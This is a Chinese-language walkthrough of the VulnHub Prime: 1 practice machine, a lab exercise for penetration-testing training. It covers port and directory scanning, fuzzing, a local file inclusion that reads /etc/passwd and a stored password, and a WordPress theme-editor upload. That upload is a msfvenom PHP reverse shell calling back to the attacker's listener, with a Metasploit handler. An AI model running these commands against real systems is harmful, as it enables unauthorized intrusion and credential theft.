vulnhub靶场–prime1

前言

vulnhub是一个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。

环境准备

1.kail系统

安装方法请参考这篇文章https://blog.csdn.net/m0_55754984/article/details/119177156

2.靶机下载链接

Prime: 1

3.把下载的prime靶机安装到VMware中，kail和靶机的网络适配器都选择NAT模式

4.打开靶机之后出现这个界面

靶机只给了我们用户名，但是不知道密码0.0 那么就一步一步来吧，首先进行信息搜集

信息搜集

在kail中打开终端，输入 ifconfig 查看本地kail的ip地址：

知道了kail的ip地址之后，由于网络连接是NAT模式，我们可以使用nmap来进行c段扫描，扫描局域网内的c段主机，从而得到靶机的ip地址，执行下列命令进行c段扫描：

nmap -sP 192.168.233.1/24

从而得到靶机ip为192.168.233.132，有了ip地址之后，接着需要发现靶机上开启了哪些服务，即要进行端口扫描

nmap -sS -sV -p- -T5 192.168.233.132

通过分析以上结果，发现靶机开启了ssh和web服务，那么我们可以通过浏览器访问web服务看看能得到什么信息

通过观察页面和查看源码都没有发现一点有用的信息，下一步我们要对网站的目录进行深入挖掘

目录扫描

工具：dirb

dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。 采用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站，是在信息收集阶段获取目标信息常用工具手段。

执行以下命令来进行目录扫描：

dirb http://192.168.233.132

扫描的结果：

可以看到扫描到了一些有用的东西，比如

http://192.168.233.132/dev

http://192.168.233.132/wordpress/

如果找到location.txt的位置，就知道下一步怎么做（先记住它，后面会用到）

文件包含

Fuzz是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试;

输入如下命令来对index.php进行测试

wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt   http://192.168.233.132/index.php?FUZZ

得到如下结果：

一共951条查询结果，数量庞大，我们可以过滤掉一些信息

wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12   http://192.168.233.132/index.php?FUZZ

成功得到了参数

根据之前的提示，我们需要访问location.txt来得到下一步信息

提示我们要用“secrettier360”参数来访问其他php页面

访问image.php

curl http://192.168.233.132/image.php?secrettier360=/etc/passwd

得到如下信息：

通过观察上述信息可以知道密码在/home/saket/password.txt中

终端输入

curl http://192.168.233.132/image.php?secrettier360=/home/saket/password.txt

得到如下结果：

密码为 follow_the_ippsec

wordpress漏洞利用

回到我们之前打开的wordpress后台管理界面，账号就是victor，密码我们也找到了，接下来登录进去：

也可以通过wpscan扫描得到用户名

wpscan --url http://192.168.233.132/wordpress/ --enumerate u

得到如下结果：

很明显用户名为victor

登录进入之后，利用主题编辑器(Appearance-Theme Editor)的漏洞进行反弹代码的上传。

启动msfvenom来生成shell

msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.233.134 lport=7777 -o shell.php

然后将shell.php的内容复制到主题编辑器中

配置metasploit

启动msfconsole，执行

use exploit/multi/handler

开启监听

设置payload

set payload php/meterpreter/reverse_tcp

设置ip和端口号

set lhost 192.168.233.134
set lport 7777

执行exploit启动监听，访问 http://192.168.37.19/wordpress/wp-content/themes/twentynineteen/secret.php，成功反弹shell。

但是现在的权限很低，要想获得更高权限，需要进行提权。
